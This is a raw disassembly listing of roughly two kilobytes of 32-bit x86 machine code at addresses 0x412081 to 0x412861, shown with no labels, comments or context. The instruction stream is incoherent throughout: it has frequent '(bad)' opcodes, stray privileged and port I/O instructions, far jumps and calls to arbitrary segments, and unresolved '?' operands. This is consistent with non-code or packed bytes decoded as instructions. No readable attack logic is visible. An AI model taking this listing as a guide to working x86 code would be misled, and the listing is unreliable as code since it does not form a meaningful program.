  412081:	xor    dl,BYTE PTR [edx-0x40]
  412084:	jo     0x4120af
  412086:	add    al,0xb9
  412088:	ins    DWORD PTR es:[edi],dx
  412089:	xchg   ebp,eax
  41208a:	cmc    
  41208b:	dec    ebp
  41208c:	leave  
  41208d:	adc    dl,bl
  41208f:	rcr    DWORD PTR [edi],1
  412091:	dec    eax
  412092:	mul    DWORD PTR [ebp+0xc9c5518]
  412098:	push   esp
  412099:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41209a:	fcmovnb st,st(3)
  41209c:	aad    0xf3
  41209e:	jle    0x412086
  4120a0:	pop    esp
  4120a1:	(bad)  
  4120a2:	jne    0x41203e
  4120a4:	imul   esp,DWORD PTR [eax+0x2e],0xffffffe5
  4120a8:	sbb    DWORD PTR [esi+0x61],ebp
  4120ab:	sti    
  4120ac:	pop    ebp
  4120ad:	push   ebp
  4120ae:	sbb    ah,BYTE PTR [edx-0x35]
  4120b1:	jp     0x412055
  4120b3:	test   eax,0xb6606f73
  4120b8:	jle    0x41203b
  4120ba:	inc    ebp
  4120bb:	test   eax,0xb8868dab
  4120c0:	cmp    dh,BYTE PTR ss:[edx+0x77]
  4120c4:	jmp    0x4a66:0x22ec5d08
  4120cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4120cc:	dec    ebp
  4120cd:	int    0x24
  4120cf:	sbb    edi,edi
  4120d1:	dec    edi
  4120d2:	(bad)
  4120d6:	pop    ebx
  4120d7:	mov    bl,0x1f
  4120d9:	or     al,0x99
  4120db:	jo     0x412089
  4120dd:	mov    edi,0x814aecfa
  4120e2:	outs   dx,DWORD PTR ds:[esi]
  4120e3:	imul   ebp,DWORD PTR [eax+0x2e],0x306c1316
  4120ea:	sbb    ah,BYTE PTR [esp+eax*2]
  4120ed:	and    ecx,DWORD PTR [ebx]
  4120ef:	int3   
  4120f0:	ins    DWORD PTR es:[edi],dx
  4120f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4120f2:	jp     0x4120c4
  4120f4:	adc    ebx,DWORD PTR [edi]
  4120f6:	std    
  4120f7:	and    DWORD PTR [eax],esi
  4120f9:	pusha  
  4120fa:	xor    ah,dh
  4120fc:	jle    0x4120d0
  4120fe:	inc    ecx
  4120ff:	mov    ch,0xd7
  412101:	inc    esp
  412102:	sbb    cl,BYTE PTR [esi+ebp*2-0x288b6678]
  412109:	daa    
  41210a:	jmp    0x41214e
  41210c:	fiadd  WORD PTR [bp-0x51]
  412110:	jmp    0x52b5:0x7da66ff9
  412117:	inc    esi
  412118:	repz repnz bound ebx,QWORD PTR [eax+eax*8-0x66f5c39b]
  412121:	aam    0x78
  412123:	(bad)  
  412124:	jge    0x412140
  412126:	cmc    
  412127:	jp     0x4120af
  412129:	aaa    
  41212a:	arpl   WORD PTR [ecx],bp
  41212c:	(bad)  
  41212d:	sbb    eax,0x25a2c0d8
  412132:	imul   edi,DWORD PTR [eax+edi*1],0xffffffcf
  412136:	mov    ds:0xdc0ca2e2,eax
  41213b:	jg     0x412180
  41213d:	clc    
  41213e:	push   esi
  41213f:	mov    edi,0x68e7057d
  412144:	xchg   DWORD PTR [eax+esi*8+0x8d30cd1],eax
  41214b:	imul   esp,edi,0x981b496c
  412151:	jle    0x4121c4
  412153:	xchg   eax,edi
  412155:	xchg   BYTE PTR [ebp-0x270b889a],dl
  41215b:	xor    al,BYTE PTR [ecx]
  41215d:	mov    ecx,0x30ac393
  412162:	jno    0x4121b3
  412164:	call   0x99a8b41c
  412169:	loopne 0x412192
  41216b:	gs jl  0x412143
  41216e:	mov    DWORD PTR [eax],ebx
  412170:	aaa    
  412171:	push   edi
  412172:	or     al,0x49
  412174:	fadd   DWORD PTR [edi+edi*1-0x48035f3a]
  41217b:	push   edx
  41217c:	pusha  
  41217d:	inc    edi
  41217e:	push   esi
  41217f:	(bad)  
  412180:	pop    esp
  412181:	jnp    0x412125
  412183:	cwde   
  412184:	retf   0x487c
  412187:	daa    
  412188:	or     eax,0xec3fdae3
  41218d:	xchg   edx,eax
  41218e:	mov    ch,dl
  412190:	inc    esp
  412191:	das    
  412192:	aam    0x17
  412194:	xor    eax,0xe479c8fa
  412199:	(bad)  
  41219a:	mov    bl,0xbd
  41219c:	adc    esp,DWORD PTR [esi-0x8]
  41219f:	out    dx,al
  4121a0:	and    ecx,ebx
  4121a2:	sbb    DWORD PTR [ebp+0x20],ecx
  4121a5:	dec    edx
  4121a6:	shr    DWORD PTR [eax],cl
  4121a8:	add    al,0xe7
  4121aa:	mov    ds:0x725c96,al
  4121af:	cmp    bl,BYTE PTR [ebx-0x3eef492b]
  4121b5:	or     edi,DWORD PTR [ecx+esi*8]
  4121b8:	sub    ah,BYTE PTR [ebx]
  4121ba:	lods   eax,DWORD PTR ds:[esi]
  4121bb:	sahf   
  4121bc:	fwait
  4121bd:	cmp    BYTE PTR [edi+0x54],ch
  4121c0:	ins    BYTE PTR es:[edi],dx
  4121c1:	mov    DWORD PTR [ebx-0x3a],ebp
  4121c4:	daa    
  4121c5:	stos   BYTE PTR es:[edi],al
  4121c6:	push   edx
  4121c7:	cmp    BYTE PTR [esi-0x11],ah
  4121ca:	pop    es
  4121cb:	inc    eax
  4121cc:	add    eax,0xab5eccb1
  4121d1:	push   0xf0c838f4
  4121d6:	push   eax
  4121d7:	pinsrw mm6,WORD PTR [eax],0xcc
  4121db:	cmp    cl,BYTE PTR [eax]
  4121dd:	push   esp
  4121de:	dec    edx
  4121df:	icebp  
  4121e0:	cmp    eax,0xa2259295
  4121e5:	sub    eax,eax
  4121e7:	pop    esp
  4121e8:	(bad)  
  4121e9:	pushf  
  4121ea:	rcl    DWORD PTR [ebp+0x4],1
  4121ed:	mov    edx,0xc83584dc
  4121f2:	xchg   BYTE PTR [edi+0x2905ee7e],cl
  4121f8:	out    dx,al
  4121f9:	and    BYTE PTR [ebx+0x24c83e5],al
  4121ff:	aad    0x3b
  412201:	clc    
  412202:	arpl   WORD PTR [bp+0x6f],si
  412206:	aaa    
  412207:	pop    ebx
  412208:	aas    
  412209:	push   0x41
  41220b:	inc    eax
  41220c:	mov    esp,0x6755dd52
  412211:	stos   DWORD PTR es:[edi],eax
  412212:	test   eax,0x425a9e90
  412217:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  412219:	mov    bl,0xb5
  41221b:	inc    esp
  41221c:	jb     0x4121fc
  41221e:	jge    0x412274
  412220:	call   0x98a1:0xbcc09210
  412227:	push   0x447ba00a
  41222c:	xor    DWORD PTR ds:0xf5baf691,ebx
  412232:	push   esp
  412233:	call   0x12e4:0xfb5643ed
  41223a:	out    0x29,al
  41223c:	mov    dh,0x4b
  41223e:	jo     0x4121ed
  412240:	jb     0x412277
  412242:	fsub   st,st(4)
  412244:	stos   DWORD PTR es:[edi],eax
  412245:	mov    dl,0x6f
  412247:	cmp    DWORD PTR [ecx+0x7a9bfe1a],esp
  41224d:	leave  
  41224e:	lods   al,BYTE PTR ds:[esi]
  41224f:	or     eax,0x8bf73c71
  412254:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412255:	lock icebp 
  412257:	xchg   ebx,eax
  412258:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412259:	jae    0x41228d
  41225b:	arpl   WORD PTR [eax-0x436b333f],bp
  412261:	adc    edi,DWORD PTR [esi]
  412263:	pop    ebx
  412264:	enter  0x1b14,0x7e
  412268:	out    0xd2,eax
  41226a:	pop    ecx
  41226b:	mov    dl,0xbe
  41226d:	or     dh,cl
  41226f:	lods   eax,DWORD PTR ds:[esi]
  412270:	sbb    BYTE PTR [esi+0x4513d237],0x98
  412277:	pop    esp
  412278:	jne    0x4122f7
  41227a:	add    eax,0x8c078434
  41227f:	das    
  412280:	adc    dh,BYTE PTR [esi]
  412282:	imul   esi,DWORD PTR [esi],0x57
  412285:	std    
  412286:	stos   DWORD PTR es:[edi],eax
  412287:	out    dx,eax
  412288:	daa    
  412289:	fcom   DWORD PTR [edi+0x4e]
  41228c:	and    al,0x48
  41228e:	mov    dl,0x60
  412290:	inc    esi
  412291:	mov    ebx,0x4ce98bac
  412296:	pop    esp
  412297:	push   ss
  412298:	mov    ss,edx
  41229a:	mov    ds:0x443ba15c,eax
  41229f:	int    0x55
  4122a1:	inc    ebx
  4122a2:	inc    eax
  4122a3:	adc    ecx,ecx
  4122a5:	pushf  
  4122a6:	out    dx,eax
  4122a7:	mov    ebp,0xb45ae90f
  4122ac:	pop    edi
  4122ad:	push   edx
  4122ae:	into   
  4122af:	inc    esp
  4122b0:	pop    ds
  4122b1:	cwde   
  4122b2:	popa   
  4122b3:	sub    DWORD PTR cs:[eax+edx*4],esi
  4122b7:	xor    DWORD PTR [ebx+0x7c],ebx
  4122ba:	mov    edx,0xd2e6e183
  4122bf:	adc    eax,0x99c626b3
  4122c4:	data16 or dl,BYTE PTR ds:0xb799f877
  4122cb:	ja     0x412314
  4122cd:	ror    DWORD PTR [edx+0x2a],cl
  4122d0:	out    0x6d,eax
  4122d2:	je     0x41231c
  4122d4:	mov    edx,?
  4122d6:	pop    edi
  4122d7:	ret    
  4122d8:	lds    esp,FWORD PTR [edi+0x50]
  4122db:	aas    
  4122dc:	push   ebp
  4122dd:	stos   DWORD PTR es:[edi],eax
  4122de:	fisub  DWORD PTR [eax]
  4122e0:	daa    
  4122e1:	bnd jg 0x412362
  4122e4:	mov    dh,0xec
  4122e6:	or     cl,BYTE PTR [esi]
  4122e8:	inc    edx
  4122e9:	sub    eax,0xdf69969f
  4122ee:	mov    eax,0xbb48388b
  4122f3:	xchg   esi,eax
  4122f4:	sahf   
  4122f5:	out    dx,eax
  4122f6:	pop    eax
  4122f7:	cmp    cl,bh
  4122f9:	sahf   
  4122fa:	retf   
  4122fb:	jge    0x41234d
  4122fd:	retf   
  4122fe:	pop    ss
  4122ff:	cmc    
  412300:	sub    BYTE PTR [eax+0x3e],cl
  412303:	jno    0x412314
  412305:	xlat   BYTE PTR ds:[ebx]
  412306:	mov    cl,0xed
  412308:	push   ds
  412309:	repnz dec ebx
  41230b:	arpl   WORD PTR [ebx+esi*1],bp
  41230e:	scas   al,BYTE PTR es:[edi]
  41230f:	test   al,0x3b
  412311:	call   0x79af:0x865cc718
  412318:	add    dl,BYTE PTR [ebp+0x3d3a7967]
  41231e:	(bad)  
  41231f:	pop    ebp
  412320:	jl     0x4122ce
  412322:	retf   
  412323:	lahf   
  412324:	adc    edi,ecx
  412326:	sahf   
  412327:	and    al,0x31
  412329:	popa   
  41232a:	push   edi
  41232b:	aam    0x9f
  41232d:	cwde   
  41232e:	retf   
  41232f:	mov    ds:0x7a67c05e,eax
  412334:	or     eax,DWORD PTR [edi+edi*1+0x35704394]
  41233b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41233c:	pushf  
  41233d:	inc    ecx
  41233e:	neg    BYTE PTR [ecx]
  412340:	xor    eax,0xa2c43e92
  412345:	lods   eax,DWORD PTR ds:[esi]
  412346:	popf   
  412347:	cli    
  412348:	pop    edx
  412349:	mov    ebp,0x16eaa863
  41234e:	dec    ebx
  41234f:	loopne 0x412337
  412351:	pop    esp
  412352:	dec    ecx
  412353:	mov    ch,0x8a
  412355:	int    0x5a
  412357:	mul    DWORD PTR [ebx+ebx*8+0x238eb90a]
  41235e:	mov    DWORD PTR fs:[eax+0x17],ebx
  412362:	imul   ebx,esp,0xd37ec335
  412368:	out    dx,eax
  412369:	cs (bad) 
  41236b:	mov    al,0xad
  41236d:	or     ch,cl
  41236f:	push   esp
  412370:	inc    ebx
  412371:	lahf   
  412372:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412373:	mov    bl,0xc3
  412375:	sbb    edi,ecx
  412377:	cmp    al,0xa
  412379:	das    
  41237a:	jp     0x412302
  41237c:	scas   eax,DWORD PTR es:[edi]
  41237d:	rcr    DWORD PTR [edi-0x6c],0xb6
  412381:	dec    eax
  412382:	(bad)  
  412383:	shl    BYTE PTR [ecx],1
  412385:	je     0x4123f0
  412387:	and    eax,0x867bef5b
  41238c:	lock sub al,0x10
  41238f:	(bad)  [esi+ebx*4]
  412392:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412393:	clc    
  412394:	ret    
  412395:	jno    0x412328
  412397:	mov    ch,ch
  412399:	push   ds
  41239a:	xor    ah,ch
  41239c:	pop    ecx
  41239d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41239e:	ss in  eax,0xb1
  4123a1:	adc    DWORD PTR [eax],esp
  4123a3:	lea    ebx,[ecx-0x71]
  4123a6:	(bad)  
  4123a7:	int3   
  4123a8:	xchg   edx,eax
  4123a9:	or     eax,ebx
  4123ab:	push   esi
  4123ac:	dec    ebx
  4123ad:	pop    edi
  4123ae:	jl     0x4123e5
  4123b0:	dec    edi
  4123b1:	lock mov bl,0x4
  4123b4:	sbb    bl,BYTE PTR [esi]
  4123b6:	call   0x7c72058a
  4123bb:	mov    eax,0xa3c89326
  4123c0:	dec    esi
  4123c1:	xor    DWORD PTR [ebp-0x9],ebx
  4123c4:	ret    0x3eeb
  4123c7:	mov    ch,0x3d
  4123c9:	gs sub eax,0x1f95f279
  4123cf:	(bad)  
  4123d0:	cli    
  4123d1:	cmc    
  4123d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4123d3:	pop    ss
  4123d4:	in     eax,0x18
  4123d6:	pop    ebp
  4123d7:	inc    esi
  4123d8:	inc    ebp
  4123d9:	lods   eax,DWORD PTR ds:[esi]
  4123da:	xor    eax,0x7b241ce5
  4123df:	(bad)  
  4123e0:	lock pushf 
  4123e2:	retf   0x1b2e
  4123e5:	(bad)  [ecx-0x1e]
  4123e8:	in     al,dx
  4123e9:	scas   eax,DWORD PTR es:[edi]
  4123ea:	out    dx,al
  4123eb:	(bad)  
  4123ec:	sub    edi,DWORD PTR [eax+0x23]
  4123ef:	inc    eax
  4123f0:	(bad)  
  4123f1:	ret    0x630c
  4123f4:	cli    
  4123f5:	shl    DWORD PTR [eax-0x51],cl
  4123f8:	icebp  
  4123f9:	inc    ebp
  4123fa:	call   0x5ea3:0x37e536ea
  412401:	arpl   WORD PTR [edi+0x5f086529],dx
  412407:	clc    
  412408:	and    dl,BYTE PTR [ecx]
  41240a:	aad    0x39
  41240c:	add    al,0xac
  41240e:	or     ch,ah
  412410:	mov    eax,DWORD PTR [esi]
  412412:	pop    esi
  412413:	jg     0x412429
  412415:	push   esp
  412416:	pop    ebp
  412417:	or     eax,0x27ad1d2c
  41241c:	iret   
  41241d:	mul    dh
  41241f:	push   esi
  412420:	push   ds
  412421:	sbb    al,0x4
  412423:	pop    ss
  412424:	xchg   esp,eax
  412425:	push   ecx
  412426:	in     al,0xd2
  412428:	mov    ebx,0x1607dd05
  41242d:	dec    esi
  41242e:	jmp    0x6929c638
  412433:	shl    DWORD PTR [edi+ebp*4-0x7c],cl
  412437:	ror    BYTE PTR [edx],1
  412439:	or     ebp,DWORD PTR [edi-0x12dd36c8]
  41243f:	hlt    
  412440:	mov    al,ds:0x6dc2cc4b
  412445:	in     al,0xf7
  412447:	adc    BYTE PTR [edi+0x2],dh
  41244a:	jle    0x412401
  41244c:	cli    
  41244d:	sub    BYTE PTR [edx-0x9235a69],dh
  412453:	adc    esi,eax
  412455:	xor    eax,0xef30cb22
  41245a:	ins    DWORD PTR es:[edi],dx
  41245b:	adc    eax,0xc6dcb9f
  412460:	mov    edi,0x5ff33e4f
  412465:	retf   0x636a
  412468:	icebp  
  412469:	mov    WORD PTR [ebx],ds
  41246b:	add    dl,BYTE PTR [edx-0x2de8e1a1]
  412471:	cli    
  412472:	pop    ecx
  412473:	jne    0x4124be
  412475:	cmp    eax,0x56412125
  41247a:	add    BYTE PTR [esi],ch
  41247c:	addr16 pop ebx
  41247e:	(bad)  
  41247f:	xchg   edx,eax
  412480:	aad    0x34
  412482:	mov    bh,0x52
  412484:	ins    DWORD PTR es:[edi],dx
  412485:	out    0xb9,al
  412487:	(bad)  
  412488:	pop    eax
  412489:	cmp    BYTE PTR [ebp*2-0x2017863b],ah
  412490:	inc    ebp
  412491:	xor    bh,dh
  412493:	inc    edx
  412494:	xchg   ecx,eax
  412495:	adc    BYTE PTR [ebp+0x6b2fd5af],dl
  41249b:	jnp    0x4124d8
  41249d:	mov    bl,0x9a
  41249f:	int    0x7f
  4124a1:	call   0xd3c42a4
  4124a6:	mov    edx,0x934d1615
  4124ab:	adc    dh,BYTE PTR [ecx]
  4124ad:	out    0x38,al
  4124af:	cld    
  4124b0:	xor    al,0xaf
  4124b2:	out    dx,eax
  4124b3:	jmp    0x4281666c
  4124b8:	sub    DWORD PTR [edx],0x9c2f0aff
  4124be:	xchg   edi,eax
  4124bf:	ja     0x4124c7
  4124c1:	neg    BYTE PTR [ebx]
  4124c3:	mov    ah,0x7e
  4124c5:	loop   0x412507
  4124c7:	cld    
  4124c8:	xchg   ecx,eax
  4124c9:	push   ss
  4124ca:	sub    esp,DWORD PTR [esi+0x601956f6]
  4124d0:	adc    BYTE PTR [esi+0x0],0x5a
  4124d4:	xchg   DWORD PTR [edx-0x52dece70],esi
  4124da:	data16 lock sub bh,BYTE PTR [ebx+0x36685330]
  4124e2:	add    edx,eax
  4124e4:	retf   0x569d
  4124e7:	mov    al,ah
  4124e9:	jp     0x412542
  4124eb:	std    
  4124ec:	xor    BYTE PTR [ecx],0x16
  4124ef:	cmp    al,0xe6
  4124f1:	dec    esp
  4124f2:	mov    edx,0x94b04413
  4124f7:	jnp    0x4124d8
  4124f9:	lea    esi,[eax]
  4124fb:	mov    al,0x17
  4124fd:	jo     0x412564
  4124ff:	ins    BYTE PTR es:[edi],dx
  412500:	and    eax,0xb0ea125
  412505:	jno    0x412581
  412507:	mov    eax,0x960cb16f
  41250c:	jmp    FWORD PTR [esi]
  41250e:	(bad)  
  412511:	push   eax
  412512:	(bad)  
  412513:	push   ebx
  412514:	bound  ebp,QWORD PTR [eax-0x5c]
  412517:	push   0x79747749
  41251c:	(bad)  
  41251d:	cmp    eax,ebx
  41251f:	and    BYTE PTR [ecx+0x34],dh
  412522:	(bad)  
  412524:	shr    cl,1
  412526:	jb     0x41254d
  412528:	mov    ds:0xc90b9694,al
  41252d:	test   eax,0x7c965bfa
  412532:	xor    DWORD PTR [eax-0x69],eax
  412535:	shr    BYTE PTR ss:[edi+0x30],cl
  412539:	in     al,0xaf
  41253b:	pop    edi
  41253c:	ret    
  41253d:	out    0x87,al
  41253f:	jns    0x412552
  412541:	outs   dx,BYTE PTR ds:[esi]
  412542:	aas    
  412543:	sbb    ebp,esi
  412545:	or     edx,DWORD PTR [edi-0x3aa2de47]
  41254b:	pusha  
  41254c:	xor    eax,0xcd871a19
  412551:	cmp    eax,0xe232edfb
  412556:	adc    BYTE PTR [edi+0x2],al
  412559:	mov    DWORD PTR [edi-0x5593a891],ebp
  41255f:	push   ebx
  412560:	and    eax,0x31e94507
  412565:	pop    ss
  412566:	jg     0x4125d3
  412568:	loope  0x412531
  41256a:	(bad)  
  41256b:	pop    eax
  41256c:	les    eax,FWORD PTR [ecx]
  41256e:	add    edi,DWORD PTR [ecx+ecx*2-0x3f]
  412572:	mov    ecx,0xb8f11d26
  412577:	addr16 out dx,al
  412579:	rol    edx,1
  41257b:	push   cs
  41257c:	shl    DWORD PTR [eax],cl
  41257e:	sub    DWORD PTR [eax],esi
  412580:	aas    
  412581:	mov    al,0x3b
  412583:	and    cl,BYTE PTR [esi+0x592f4f1b]
  412589:	or     DWORD PTR ds:0x4edbd4e3,ebx
  41258f:	sbb    DWORD PTR [ebx-0x64],esp
  412592:	jmp    0x412584
  412594:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412595:	sub    eax,0x9044735c
  41259a:	lahf   
  41259b:	xlat   BYTE PTR ds:[ebx]
  41259c:	xchg   esp,eax
  41259d:	div    BYTE PTR [eax+0x66ca0b4e]
  4125a3:	and    BYTE PTR [esi+edx*4+0x4e],bh
  4125a7:	dec    edx
  4125a8:	das    
  4125a9:	mov    ebp,0x68b3105c
  4125ae:	scas   al,BYTE PTR es:[edi]
  4125af:	adc    DWORD PTR [esi+0x29c6c23d],ebx
  4125b5:	jb     0x412604
  4125b7:	adc    eax,0xed68438d
  4125bc:	sbb    ch,BYTE PTR [eax+0x4c7dc968]
  4125c2:	aam    0xb7
  4125c4:	adc    eax,0x9d3003e4
  4125c9:	push   ss
  4125ca:	xchg   esi,eax
  4125cb:	inc    ebx
  4125cc:	les    ecx,FWORD PTR [edx+ebp*4+0x2701ef4b]
  4125d3:	cmp    eax,0x352c1110
  4125d8:	jne    0x4125ea
  4125da:	mov    ebp,0x4f8abd16
  4125df:	inc    ebx
  4125e0:	(bad)  
  4125e1:	aad    0xda
  4125e3:	or     BYTE PTR [eax+0x23],ch
  4125e6:	inc    esi
  4125e7:	adc    bh,BYTE PTR [ebp-0x15]
  4125ea:	sbb    BYTE PTR [ebx+0x62f94fc1],0x2c
  4125f1:	popf   
  4125f2:	in     al,dx
  4125f3:	bound  esi,QWORD PTR [edx+ebp*1]
  4125f6:	retf   
  4125f7:	rcr    DWORD PTR [edx-0x71],0xff
  4125fb:	pop    esp
  4125fc:	sub    ebx,DWORD PTR [edi]
  4125fe:	ret    
  4125ff:	add    edx,DWORD PTR [eax+0x19]
  412602:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412603:	inc    edi
  412604:	inc    eax
  412605:	mov    DWORD PTR ds:[edi],ebp
  412608:	fistp  DWORD PTR [ecx-0x764b1f62]
  41260e:	les    edx,FWORD PTR [ecx+0x5c]
  412611:	fistp  QWORD PTR [di]
  412615:	pop    ds
  412616:	inc    eax
  412617:	pop    edi
  412618:	loop   0x4125f3
  41261a:	or     esi,ebp
  41261c:	pop    es
  41261d:	mov    esi,0xcd5d9949
  412622:	jmp    0x3e3:0xc3169b08
  412629:	add    eax,0x1c37b6bf
  41262e:	mov    DWORD PTR [eax-0x6f759fce],esp
  412634:	inc    ebx
  412635:	dec    esi
  412636:	or     DWORD PTR [ecx-0x6f],0xffffffcb
  41263a:	outs   dx,DWORD PTR ds:[esi]
  41263b:	adc    al,0x1f
  41263d:	push   0x7e
  41263f:	mov    dl,0x9b
  412641:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412642:	fisubr DWORD PTR [eax-0x7a]
  412645:	mov    BYTE PTR [edx+0x3bf0ec53],bh
  41264b:	outs   dx,DWORD PTR ds:[esi]
  41264c:	imul   eax,DWORD PTR [edx],0x38
  41264f:	nop
  412650:	(bad)  
  412651:	and    BYTE PTR [edx],ah
  412653:	push   ebx
  412654:	cmp    BYTE PTR [edx+0x40],0x46
  412658:	scas   al,BYTE PTR es:[edi]
  412659:	stc    
  41265a:	xor    BYTE PTR [esi],bl
  41265c:	shl    BYTE PTR [edi+0x6ca304b7],1
  412662:	repnz pop ss
  412664:	sti    
  412665:	xor    ch,BYTE PTR [ecx]
  412667:	(bad)  
  412668:	aaa    
  412669:	std    
  41266a:	in     al,0xc5
  41266c:	pop    ecx
  41266d:	dec    ebx
  41266e:	mov    ds:0x8d42c483,eax
  412673:	cmp    ebx,DWORD PTR [edx]
  412675:	mov    ?,WORD PTR ds:0xadd5cceb
  41267b:	loopne 0x4126c9
  41267d:	xor    DWORD PTR [ecx-0x50],eax
  412680:	jno    0x4126a8
  412682:	sbb    esp,DWORD PTR [eax+0x1f3c3ede]
  412688:	jle    0x4126f4
  41268a:	cmp    bl,BYTE PTR [ebx+eax*1+0x5b16924a]
  412691:	mov    edi,0x47b9767f
  412696:	(bad)  
  412697:	aas    
  412698:	and    eax,DWORD PTR [eax-0x6892f901]
  41269e:	pop    es
  41269f:	cmp    ebp,DWORD PTR [eax+0x11fc1489]
  4126a5:	mov    esp,0xc4b069f
  4126aa:	enter  0x4f94,0xa6
  4126ae:	or     BYTE PTR [eiz*2-0x76b62965],0x42
  4126b6:	sbb    dh,cl
  4126b8:	imul   edx,DWORD PTR [edi],0x17c401bb
  4126be:	mov    ds,WORD PTR [ebx-0x783412a]
  4126c4:	fadd   DWORD PTR [ecx]
  4126c6:	icebp  
  4126c7:	lahf   
  4126c8:	jl     0x412713
  4126ca:	sahf   
  4126cb:	sbb    al,0xb7
  4126cd:	call   0x1173:0x7911ed8e
  4126d4:	jecxz  0x412719
  4126d6:	scas   eax,DWORD PTR es:[edi]
  4126d7:	xor    al,0x65
  4126d9:	ret    
  4126da:	add    dh,BYTE PTR [esi]
  4126dc:	bound  ebp,QWORD PTR [ebp+0x4c731c8b]
  4126e2:	sahf   
  4126e3:	mov    ebx,0xfbfb290a
  4126e8:	push   ebx
  4126e9:	sub    al,0x16
  4126eb:	test   BYTE PTR ds:0xff0f434b,ah
  4126f1:	jle    0x41275a
  4126f3:	jl     0x41269f
  4126f5:	lahf   
  4126f6:	mov    ch,BYTE PTR [edi+0x73]
  4126f9:	sub    esp,esp
  4126fb:	fsub   DWORD PTR [esi+0x6a80b9a]
  412701:	pop    eax
  412702:	jb     0x412701
  412704:	mov    al,0x2e
  412706:	in     al,dx
  412707:	daa    
  412708:	jmp    0xf00:0x405646aa
  41270f:	sbb    BYTE PTR [esi-0x57],dl
  412712:	push   cs
  412713:	jg     0x412741
  412715:	mov    esp,esi
  412717:	mov    dh,0x43
  412719:	adc    al,0x45
  41271b:	fild   WORD PTR [ecx+0x53970821]
  412721:	(bad)  
  412722:	xlat   BYTE PTR ds:[ebx]
  412723:	sbb    eax,0xec8fc973
  412728:	sbb    ebx,ebx
  41272a:	mov    esi,DWORD PTR [ebx+0x5e]
  41272d:	call   0x7383:0xfc5feebc
  412734:	int3   
  412735:	clc    
  412736:	jge    0x412731
  412738:	ins    DWORD PTR es:[edi],dx
  412739:	xor    eax,0x3bc2c890
  41273e:	mov    dh,0x5e
  412740:	cmp    eax,0x9d28942e
  412745:	push   edx
  412746:	mov    edx,0xa187e181
  41274b:	popf   
  41274c:	or     eax,0xd15f06df
  412751:	and    DWORD PTR [esi],esp
  412753:	in     al,dx
  412754:	dec    ecx
  412755:	and    ebp,0xafe10ad6
  41275b:	mov    dl,0x2e
  41275d:	(bad)  
  41275e:	scas   al,BYTE PTR es:[edi]
  41275f:	push   es
  412760:	es pop ebp
  412762:	dec    esi
  412763:	jne    0x4127e3
  412765:	jno    0x4127dd
  412767:	inc    edx
  412768:	(bad)  
  412769:	lds    ecx,FWORD PTR [ecx]
  41276b:	setnp  ch
  41276e:	add    eax,0xaf9ee1e9
  412773:	fs push esi
  412775:	into   
  412776:	retf   0xb023
  412779:	ss pop ss
  41277b:	arpl   WORD PTR [ecx-0x34],ax
  41277e:	hlt    
  41277f:	push   0xfffffff6
  412781:	loop   0x412772
  412783:	pop    ds
  412784:	inc    ebp
  412785:	es rol dl,cl
  412788:	jmp    0x4127f2
  41278a:	clc    
  41278b:	mov    dl,BYTE PTR [ebx-0x2880e2f8]
  412791:	sub    ecx,DWORD PTR [esi+0x73]
  412794:	dec    eax
  412795:	out    dx,al
  412796:	in     ax,0x8e
  412799:	sar    ch,1
  41279b:	inc    eax
  41279c:	or     eax,0x1f91008c
  4127a1:	std    
  4127a2:	xor    ah,BYTE PTR [ebx+0x39555c75]
  4127a8:	fsub   DWORD PTR [esi+0x2c76cc92]
  4127ae:	add    edx,DWORD PTR [ebx+0x29256bf2]
  4127b4:	jmp    0x23cfc53e
  4127b9:	ret    0xf496
  4127bc:	mov    esp,0xaf015c68
  4127c1:	pop    ebp
  4127c2:	pop    esp
  4127c3:	cwd    
  4127c5:	xchg   DWORD PTR [esi-0x1],edx
  4127c8:	shl    DWORD PTR [ebp-0x6d],cl
  4127cb:	es jns 0x412840
  4127ce:	adc    al,0xa8
  4127d0:	cmp    al,BYTE PTR [edx+edi*4-0x3bb9a9e]
  4127d7:	mov    esi,0xfd620823
  4127dc:	or     ecx,DWORD PTR [edx-0x39]
  4127df:	imul   ebp,DWORD PTR [ecx-0x5c],0x52e3cfab
  4127e6:	inc    edi
  4127e7:	es xchg edi,eax
  4127e9:	and    edi,DWORD PTR [edi+ebx*1-0x62c4efcd]
  4127f0:	sbb    BYTE PTR [esi+0x3e7fb700],dh
  4127f6:	rcr    BYTE PTR [eax],0xc2
  4127f9:	out    dx,al
  4127fa:	mov    bh,0x5a
  4127fc:	int    0x5f
  4127fe:	(bad)  
  4127ff:	fbld   TBYTE PTR [edi+0x39]
  412802:	loop   0x412856
  412804:	pop    edx
  412805:	fisub  WORD PTR [ebp-0x3653e62d]
  41280b:	adc    eax,0x39461122
  412810:	aam    0xa9
  412812:	paddq  mm3,mm2
  412815:	(bad)  
  412816:	lods   al,BYTE PTR ds:[esi]
  412817:	jns    0x412809
  412819:	sub    BYTE PTR [ecx-0x75],cl
  41281c:	or     eax,0x1cfae07d
  412821:	ins    BYTE PTR es:[edi],dx
  412822:	ret    0x7bc9
  412825:	and    dh,bl
  412827:	sbb    al,bh
  412829:	les    esi,FWORD PTR [edx+edi*8-0x46]
  41282d:	test   al,0xda
  41282f:	jmp    0x4128ae
  412831:	xor    BYTE PTR [edx-0x1c],0x9b
  412835:	ret    
  412836:	push   0xffffffce
  412838:	mov    esi,gs
  41283a:	and    ebp,DWORD PTR [edx+0x3e8ad7c1]
  412840:	mov    al,0xe9
  412842:	pop    ebx
  412843:	fucomi st,st(6)
  412845:	shl    BYTE PTR [edx],cl
  412847:	mov    bl,0x4c
  412849:	icebp  
  41284a:	push   0x4
  41284c:	dec    ebx
  41284d:	and    BYTE PTR [eax],cl
  41284f:	lea    esp,[edx+0x12b16eb6]
  412855:	clc    
  412856:	aas    
  412857:	imul   edi,DWORD PTR [esi+0x397498f8],0x764a82d5
  412861:	fistp  WORD PTR [ecx-0x637f6d4b]
